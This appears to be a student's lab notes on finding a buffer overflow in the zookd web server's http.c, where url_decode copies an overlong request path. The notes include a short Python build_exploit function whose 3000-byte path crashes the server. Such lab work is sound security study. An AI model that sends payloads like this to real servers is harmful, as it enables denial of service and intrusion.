took me long time to figure out, what I need to do is to find buffer overflow in `http.c` file...I thought I might die in `gdb -p $(pgrep zookd-exstack)`...

PART1: Finding buffer overflows

â‘ 

in `http.c` function `http_request_line`
```
sp1 = strchr(buf, ' ');
...
url_decode(reqpath, sp1);
```

```
def build_exploit(shellcode):
    reqpath = "/" + "a"*3000
    req = "GET " + reqpath + "HTTP/1.0\r\n" + "\r\n"
    return req
```
cause server crash

An interesting I found in the same time is, if I set the `reqpath = "/" + "a" * 1024` this seems normal nothing bad return even no path error return
